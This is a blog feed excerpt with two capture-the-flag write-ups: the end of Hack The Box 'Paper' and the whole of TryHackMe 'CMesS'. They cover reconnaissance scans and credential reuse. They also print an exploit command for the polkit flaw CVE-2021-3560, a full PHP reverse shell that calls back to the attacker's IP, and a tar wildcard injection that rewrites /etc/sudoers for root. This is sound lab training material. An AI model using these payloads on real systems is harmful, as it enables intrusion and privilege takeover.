lrwxrwxrwx <span style="color:#ae81ff">1</span> dwight dwight <span style="color:#ae81ff">9</span> Jul <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">2021</span> .bash_history -&gt; /dev/null
-rw-r--r-- <span style="color:#ae81ff">1</span> dwight dwight <span style="color:#ae81ff">18</span> May <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">2019</span> .bash_logout
-rw-r--r-- <span style="color:#ae81ff">1</span> dwight dwight <span style="color:#ae81ff">141</span> May <span style="color:#ae81ff">10</span> <span style="color:#ae81ff">2019</span> .bash_profile
-rw-r--r-- <span style="color:#ae81ff">1</span> dwight dwight <span style="color:#ae81ff">358</span> Jul <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">2021</span> .bashrc
-rwxr-xr-x <span style="color:#ae81ff">1</span> dwight dwight <span style="color:#ae81ff">1174</span> Sep <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">2021</span> bot_restart.sh
drwx------ <span style="color:#ae81ff">5</span> dwight dwight <span style="color:#ae81ff">56</span> Jul <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">2021</span> .config
-rw------- <span style="color:#ae81ff">1</span> dwight dwight <span style="color:#ae81ff">16</span> Jul <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">2021</span> .esd_auth
drwx------ <span style="color:#ae81ff">2</span> dwight dwight <span style="color:#ae81ff">44</span> Jul <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">2021</span> .gnupg
drwx------ <span style="color:#ae81ff">8</span> dwight dwight <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">2021</span> hubot
-rw-rw-r-- <span style="color:#ae81ff">1</span> dwight dwight <span style="color:#ae81ff">18</span> Sep <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">2021</span> .hubot_history
drwx------ <span style="color:#ae81ff">3</span> dwight dwight <span style="color:#ae81ff">19</span> Jul <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">2021</span> .local
drwxr-xr-x <span style="color:#ae81ff">4</span> dwight dwight <span style="color:#ae81ff">39</span> Jul <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">2021</span> .mozilla
drwxrwxr-x <span style="color:#ae81ff">5</span> dwight dwight <span style="color:#ae81ff">83</span> Jul <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">2021</span> .npm
drwxr-xr-x <span style="color:#ae81ff">4</span> dwight dwight <span style="color:#ae81ff">32</span> Jul <span style="color:#ae81ff">3</span> <span style="color:#ae81ff">2021</span> sales
drwx------ <span style="color:#ae81ff">2</span> dwight dwight <span style="color:#ae81ff">6</span> Sep <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">2021</span> .ssh
-r-------- <span style="color:#ae81ff">1</span> dwight dwight <span style="color:#ae81ff">33</span> Apr <span style="color:#ae81ff">4</span> 12:15 user.txt
drwxr-xr-x <span style="color:#ae81ff">2</span> dwight dwight <span style="color:#ae81ff">24</span> Sep <span style="color:#ae81ff">16</span> <span style="color:#ae81ff">2021</span> .vim

</code></pre></div><p>After inspecting the files, it appears that the bot is <code>hubot</code>. Within the hubot</p>
<p>Inside the hubot folder there is a file called <code>.env</code></p>

    <img src="/images/htb/Paper/Untitled%2011.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/Paper/Untitled%2012.png"  class="center"  style="border-radius: 10px;"  />


<p>Found a User and pass Combination</p>
<h1 id="ssh-access">SSH Access</h1>
<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>Using the new credentials, I attempted to log in via SSH, but it seems that the user &lsquo;recyclops&rsquo; does not have SSH access permissions.</p>

    <img src="/images/htb/Paper/Untitled%2013.png"  class="center"  style="border-radius: 10px;"  />


<p>I made an attempt to log into the web console:</p>

    <img src="/images/htb/Paper/Untitled%2014.png"  class="center"  style="border-radius: 10px;"  />


<p>Besides the &lsquo;recyclops&rsquo; user, there is also a &lsquo;dwight&rsquo; user who appears to be reusing passwords. We successfully retrieved the first flag:</p>

    <img src="/images/htb/Paper/Untitled%2015.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/Paper/Untitled%2016.png"  class="center"  style="border-radius: 10px;"  />


<h1 id="privesc">PrivEsc</h1>
<h2 id="enumeration-1">Enumeration</h2>
<p>Downloaded <code>linpeas</code> to automate the privilege escalation process.</p>

    <img src="/images/htb/Paper/Untitled%2017.png"  class="center"  style="border-radius: 10px;"  />


<p>After reviewing the results from linpeas, I identified some potential privilege escalation avenues. Notably, CVE-2021-3560 appears to be a promising candidate</p>

    <img src="/images/htb/Paper/Untitled%2018.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/Paper/Untitled%2018.png"  class="center"  style="border-radius: 10px;"  />


<h2 id="exploit">Exploit</h2>
<p><a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation" target="_blank" >https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./exploit.sh -u<span style="color:#f92672">=</span>hacker -p<span style="color:#f92672">=</span>password -f<span style="color:#f92672">=</span>y
</code></pre></div><p>I encountered an authentication error occasionally, so I executed the command approximately five times until it worked successfully.</p>

    <img src="/images/htb/Paper/Untitled%2020.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/Paper/Untitled%2021.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/htb/Paper/Untitled%2022.png"  class="center"  style="border-radius: 10px;"  />


<p><a href="https://www.hackthebox.com/achievement/machine/635352/432" target="_blank" >Owned Paper from Hack The Box!</a></p>
]]></content>
        </item>
        
        <item>
            <title>TryHackme - CMEss - Write Up</title>
            <link>https://nmmorette.github.io/posts/2022/04/tryhackme-cmess-write-up/</link>
            <pubDate>Sun, 03 Apr 2022 00:00:00 +0000</pubDate>
            
            <guid>https://nmmorette.github.io/posts/2022/04/tryhackme-cmess-write-up/</guid>
            <description>CMesS TryHackMe | CMesS
Enumeration nmap I started with a basic scan to identify open ports:
sudo nmap -sS cmess.thm Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-31 15:58 -03 Nmap scan report for cmess.thm (10.10.172.41) Host is up (0.33s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 3.47 seconds Then I ran a more aggressive scan against those ports:</description>
            <content type="html"><![CDATA[<h1 id="cmess">CMesS</h1>
<p><a href="https://tryhackme.com/room/cmess" target="_blank" >TryHackMe | CMesS</a></p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="nmap">nmap</h3>
<p>I started with a basic scan to identify open ports:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sS cmess.thm
Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-03-31 15:58 -03
Nmap scan report <span style="color:#66d9ef">for</span> cmess.thm <span style="color:#f92672">(</span>10.10.172.41<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.33s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 3.47 seconds
</code></pre></div><p>Then I ran a more aggressive scan against those ports:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sS cmess.thm -p80,22 -A
Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-03-31 15:59 -03
Nmap scan report <span style="color:#66d9ef">for</span> cmess.thm <span style="color:#f92672">(</span>10.10.172.41<span style="color:#f92672">)</span>
Host is up <span style="color:#f92672">(</span>0.30s latency<span style="color:#f92672">)</span>.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
| ssh-hostkey: 
|   <span style="color:#ae81ff">2048</span> d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
|   <span style="color:#ae81ff">256</span> 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
|_  <span style="color:#ae81ff">256</span> 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
|_http-generator: Gila CMS
|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>UTF-8<span style="color:#f92672">)</span>.
| http-robots.txt: <span style="color:#ae81ff">3</span> disallowed entries 
|_/src/ /themes/ /lib/
Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
Aggressive OS guesses: Linux 3.10 - 3.13 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 5.4 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, ASUS RT-N56U WAP <span style="color:#f92672">(</span>Linux 3.4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.16 <span style="color:#f92672">(</span>95%<span style="color:#f92672">)</span>, Linux 3.1 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, Linux 3.2 <span style="color:#f92672">(</span>93%<span style="color:#f92672">)</span>, AXIS 210A or <span style="color:#ae81ff">211</span> Network Camera <span style="color:#f92672">(</span>Linux 2.6.17<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Sony Android TV <span style="color:#f92672">(</span>Android 5.0<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Android 5.0 - 6.0.1 <span style="color:#f92672">(</span>Linux 3.4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Android 5.1 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>
No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.
Network Distance: <span style="color:#ae81ff">4</span> hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE <span style="color:#f92672">(</span>using port 443/tcp<span style="color:#f92672">)</span>
HOP RTT       ADDRESS
<span style="color:#ae81ff">1</span>   180.97 ms 10.13.0.1
<span style="color:#ae81ff">2</span>   ... <span style="color:#ae81ff">3</span>
<span style="color:#ae81ff">4</span>   321.30 ms cmess.thm <span style="color:#f92672">(</span>10.10.172.41<span style="color:#f92672">)</span>

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 28.59 seconds
</code></pre></div><p><strong>Interesting Info:</strong></p>
<ul>
<li><strong>SSH:</strong> OpenSSH 7.2p2 (Ubuntu)</li>
<li><strong>HTTP:</strong> Apache 2.4.18 + Gila CMS</li>
<li>The robots.txt file disallowed: <code>/src/</code>, <code>/themes/</code>, <code>/lib/</code></li>
</ul>
<h2 id="http---enumeration">HTTP - Enumeration</h2>
<h3 id="discovering-directories-with-gobuster">Discovering directories with Gobuster</h3>
<p>I used <strong>gobuster</strong> to find hidden directories:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -u  http://cmess.thm/ -w /usr/share/wordlists/dirb/common.txt -x txt,html,php --no-error

</code></pre></div><p><strong>Found:</strong></p>
<ul>
<li><code>/admin</code></li>
<li><code>/blog</code></li>
<li><code>/feed</code></li>
<li><code>/fm</code></li>
</ul>
<h3 id="subdomain-brute-force-with-wfuzz">Subdomain brute-force with Wfuzz</h3>
<p><strong>Discovered subdomain:</strong> <code>dev.cmess.thm</code> using wfuzz</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wfuzz -c -w /usr/share/wordlists/subdomain/subdomains-1000.txt -u  http://cmess.thm -H <span style="color:#e6db74">&#34;Host: FUZZ.cmess.thm&#34;</span> --hw <span style="color:#ae81ff">290</span>
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span style="color:#960050;background-color:#1e0010">&#39;</span>s documentation <span style="color:#66d9ef">for</span> more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 999

<span style="color:#f92672">=====================================================================</span>
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                                                                                                      
<span style="color:#f92672">=====================================================================</span>

000000021:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">30</span> L     <span style="color:#ae81ff">104</span> W      <span style="color:#ae81ff">934</span> Ch      <span style="color:#e6db74">&#34;dev&#34;</span>
</code></pre></div>
    <img src="/images/cmes/Untitled.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/cmes/Untitled1.png"  class="center"  style="border-radius: 10px;"  />


<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<h2 id="exploit">Exploit</h2>
<p>Search for the exploit on google:</p>
<p><a href="https://www.exploit-db.com/exploits/47407" target="_blank" >Offensive Security&rsquo;s Exploit Database Archive</a></p>
<p>I tried exploiting a <strong>LFI</strong> on the <code>/admin/fm/</code> panel to read <code>/etc/passwd</code>, but the payload didn’t work.</p>
<p>However, accessing just <code>/fm</code> revealed a file manager panel!</p>

    <img src="/images/cmes/Untitled%203.png"  class="center"  style="border-radius: 10px;"  />


<p>I created a <code>shell.php</code> file using the classic <strong>PentestMonkey</strong> reverse shell, pointed it to my IP and port 1234.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&lt;?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> <span style="color:#ae81ff">2007</span> pentestmonkey@pentestmonkey.net

set_time_limit <span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
$VERSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1.0&#34;</span>;
$ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;10.13.39.32&#39;</span>;
$port <span style="color:#f92672">=</span> 1234;
$chunk_size <span style="color:#f92672">=</span> 1400;
$write_a <span style="color:#f92672">=</span> null;
$error_a <span style="color:#f92672">=</span> null;
$shell <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;uname -a; w; id; sh -i&#39;</span>;
$daemon <span style="color:#f92672">=</span> 0;
$debug <span style="color:#f92672">=</span> 0;

<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>function_exists<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;pcntl_fork&#39;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
	$pid <span style="color:#f92672">=</span> pcntl_fork<span style="color:#f92672">()</span>;
	
	<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$pid <span style="color:#f92672">==</span> -1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
		printit<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ERROR: Can&#39;t fork&#34;</span><span style="color:#f92672">)</span>;
		exit<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>;
	<span style="color:#f92672">}</span>
	
	<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$pid<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
		exit<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;  // Parent exits
	<span style="color:#f92672">}</span>
	<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>posix_setsid<span style="color:#f92672">()</span> <span style="color:#f92672">==</span> -1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
		printit<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Error: Can&#39;t setsid()&#34;</span><span style="color:#f92672">)</span>;
		exit<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>;
	<span style="color:#f92672">}</span>

	$daemon <span style="color:#f92672">=</span> 1;
<span style="color:#f92672">}</span> <span style="color:#66d9ef">else</span> <span style="color:#f92672">{</span>
	printit<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;WARNING: Failed to daemonise.  This is quite common and not fatal.&#34;</span><span style="color:#f92672">)</span>;
<span style="color:#f92672">}</span>

chdir<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">)</span>;

umask<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;

// Open reverse connection
$sock <span style="color:#f92672">=</span> fsockopen<span style="color:#f92672">(</span>$ip, $port, $errno, $errstr, 30<span style="color:#f92672">)</span>;
<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>!$sock<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
	printit<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;</span>$errstr<span style="color:#e6db74"> (</span>$errno<span style="color:#e6db74">)&#34;</span><span style="color:#f92672">)</span>;
	exit<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>;
<span style="color:#f92672">}</span>

$descriptorspec <span style="color:#f92672">=</span> array<span style="color:#f92672">(</span>
   0 <span style="color:#f92672">=</span>&gt; array<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">)</span>,  // stdin is a pipe that the child will read from
   1 <span style="color:#f92672">=</span>&gt; array<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span><span style="color:#f92672">)</span>,  // stdout is a pipe that the child will write to
   2 <span style="color:#f92672">=</span>&gt; array<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;pipe&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span><span style="color:#f92672">)</span>   // stderr is a pipe that the child will write to
<span style="color:#f92672">)</span>;

$process <span style="color:#f92672">=</span> proc_open<span style="color:#f92672">(</span>$shell, $descriptorspec, $pipes<span style="color:#f92672">)</span>;

<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>!is_resource<span style="color:#f92672">(</span>$process<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
	printit<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ERROR: Can&#39;t spawn shell&#34;</span><span style="color:#f92672">)</span>;
	exit<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>;
<span style="color:#f92672">}</span>

stream_set_blocking<span style="color:#f92672">(</span>$pipes<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>, 0<span style="color:#f92672">)</span>;
stream_set_blocking<span style="color:#f92672">(</span>$pipes<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>, 0<span style="color:#f92672">)</span>;
stream_set_blocking<span style="color:#f92672">(</span>$pipes<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>, 0<span style="color:#f92672">)</span>;
stream_set_blocking<span style="color:#f92672">(</span>$sock, 0<span style="color:#f92672">)</span>;

printit<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Successfully opened reverse shell to </span>$ip<span style="color:#e6db74">:</span>$port<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span>;

<span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
	<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>feof<span style="color:#f92672">(</span>$sock<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
		printit<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ERROR: Shell connection terminated&#34;</span><span style="color:#f92672">)</span>;
		break;
	<span style="color:#f92672">}</span>

	<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>feof<span style="color:#f92672">(</span>$pipes<span style="color:#f92672">[</span>1<span style="color:#f92672">]))</span> <span style="color:#f92672">{</span>
		printit<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;ERROR: Shell process terminated&#34;</span><span style="color:#f92672">)</span>;
		break;
	<span style="color:#f92672">}</span>

	$read_a <span style="color:#f92672">=</span> array<span style="color:#f92672">(</span>$sock, $pipes<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>, $pipes<span style="color:#f92672">[</span>2<span style="color:#f92672">])</span>;
	$num_changed_sockets <span style="color:#f92672">=</span> stream_select<span style="color:#f92672">(</span>$read_a, $write_a, $error_a, null<span style="color:#f92672">)</span>;

	<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>in_array<span style="color:#f92672">(</span>$sock, $read_a<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
		<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$debug<span style="color:#f92672">)</span> printit<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;SOCK READ&#34;</span><span style="color:#f92672">)</span>;
		$input <span style="color:#f92672">=</span> fread<span style="color:#f92672">(</span>$sock, $chunk_size<span style="color:#f92672">)</span>;
		<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$debug<span style="color:#f92672">)</span> printit<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;SOCK: </span>$input<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span>;
		fwrite<span style="color:#f92672">(</span>$pipes<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>, $input<span style="color:#f92672">)</span>;
	<span style="color:#f92672">}</span>

	<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>in_array<span style="color:#f92672">(</span>$pipes<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>, $read_a<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
		<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$debug<span style="color:#f92672">)</span> printit<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;STDOUT READ&#34;</span><span style="color:#f92672">)</span>;
		$input <span style="color:#f92672">=</span> fread<span style="color:#f92672">(</span>$pipes<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>, $chunk_size<span style="color:#f92672">)</span>;
		<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$debug<span style="color:#f92672">)</span> printit<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;STDOUT: </span>$input<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span>;
		fwrite<span style="color:#f92672">(</span>$sock, $input<span style="color:#f92672">)</span>;
	<span style="color:#f92672">}</span>

	<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>in_array<span style="color:#f92672">(</span>$pipes<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>, $read_a<span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
		<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$debug<span style="color:#f92672">)</span> printit<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;STDERR READ&#34;</span><span style="color:#f92672">)</span>;
		$input <span style="color:#f92672">=</span> fread<span style="color:#f92672">(</span>$pipes<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span>, $chunk_size<span style="color:#f92672">)</span>;
		<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>$debug<span style="color:#f92672">)</span> printit<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;STDERR: </span>$input<span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span>;
		fwrite<span style="color:#f92672">(</span>$sock, $input<span style="color:#f92672">)</span>;
	<span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>

fclose<span style="color:#f92672">(</span>$sock<span style="color:#f92672">)</span>;
fclose<span style="color:#f92672">(</span>$pipes<span style="color:#f92672">[</span>0<span style="color:#f92672">])</span>;
fclose<span style="color:#f92672">(</span>$pipes<span style="color:#f92672">[</span>1<span style="color:#f92672">])</span>;
fclose<span style="color:#f92672">(</span>$pipes<span style="color:#f92672">[</span>2<span style="color:#f92672">])</span>;
proc_close<span style="color:#f92672">(</span>$process<span style="color:#f92672">)</span>;

<span style="color:#66d9ef">function</span> printit <span style="color:#f92672">(</span>$string<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
	<span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>!$daemon<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
		print <span style="color:#e6db74">&#34;</span>$string<span style="color:#e6db74">\n&#34;</span>;
	<span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>

?&gt;
</code></pre></div><p>Open a listener and shell successfully received.</p>

    <img src="/images/cmes/Untitled4.png"  class="center"  style="border-radius: 10px;"  />


<h3 id="stabilizing-the-shell">Stabilizing the Shell</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -c <span style="color:#960050;background-color:#1e0010">&#39;</span>import pty;pty.spawn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash&#34;</span><span style="color:#f92672">)</span>’
</code></pre></div><h2 id="privilege-escalation---part-1">Privilege Escalation - Part 1</h2>
<p>Looks like we don&rsquo;t have access to /home/andre.</p>

    <img src="/images/cmes/Untitled5.png"  class="center"  style="border-radius: 10px;"  />


<p>Found something interesting while searching for the user.txt flag  in /tmp folder by manual enumeration:</p>
<p>While manually enumerating, I noticed weird files in the <code>/tmp</code> folder and suspected a scheduled backup task.</p>

    <img src="/images/cmes/Untitled6.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/cmes/Untitled%257.png"  class="center"  style="border-radius: 10px;"  />


<p>I found a recurring backup job.</p>

    <img src="/images/cmes/Untitled%258.png"  class="center"  style="border-radius: 10px;"  />


<p>Yes found some backup task and maybe it’s vulnerable by cron wildcards, but I cant do much without access to andre’s folder.</p>
<p>To enhance the enumeration process, I ran <code>linpeas.sh</code>. First, I set up a Python3 web server on my machine to transfer the script to the target:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -m http.server <span style="color:#ae81ff">80</span>
</code></pre></div><p>Download into <code>/tmp</code> folder with <code>wget</code>, set permissions and run.</p>
<p>Linpeas popup the schedule task</p>

    <img src="/images/cmes/Untitled9.png"  class="center"  style="border-radius: 10px;"  />


<p>This one was hard to notice, a .bak file named password.</p>

    <img src="/images/cmes/Untitled10.png"  class="center"  style="border-radius: 10px;"  />



    <img src="/images/cmes/Untitled11.png"  class="center"  style="border-radius: 10px;"  />


<!-- raw HTML omitted -->
<!-- raw HTML omitted -->
<p>Tried it using <code>su andre</code>—and it worked! ✨</p>

    <img src="/images/cmes/Untitled12.png"  class="center"  style="border-radius: 10px;"  />


<p>Then I closed the reverse shell and opened a stable SSH session:</p>

    <img src="/images/cmes/Untitled13.png"  class="center"  style="border-radius: 10px;"  />


<p>First flag.</p>
<p>At this point I know that is possible to privesc with cron wildcards</p>
<h2 id="privilege-escalation---part-2">Privilege Escalation - Part 2</h2>
<p>Since I knew there was a scheduled task possible with wildcards vulnerable, I exploited it using <strong>cron wildcard injection</strong> to escalate privileges.</p>
<p>I created these files to privesc to root:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#39;echo &#34;andre ALL=(root) NOPASSWD: ALL&#34; &gt; /etc/sudoers&#39;</span> &gt; privesc.sh
echo <span style="color:#e6db74">&#34;&#34;</span> &gt; <span style="color:#e6db74">&#34;--checkpoint-action=exec=sh privesc.sh&#34;</span>
echo <span style="color:#e6db74">&#34;&#34;</span> &gt; --checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</code></pre></div><p>Waited a minute for the cron job to trigger, then ran: <code>sudo bash.</code></p>

    <img src="/images/cmes/Untitled14.png"  class="center"  style="border-radius: 10px;"  />


]]></content>
        </item>
        
        <item>
            <title>RoadMap para AZ-900 (Pt-br)</title>
            <link>https://nmmorette.github.io/posts/2021/09/roadmap-para-az-900-pt-br/</link>
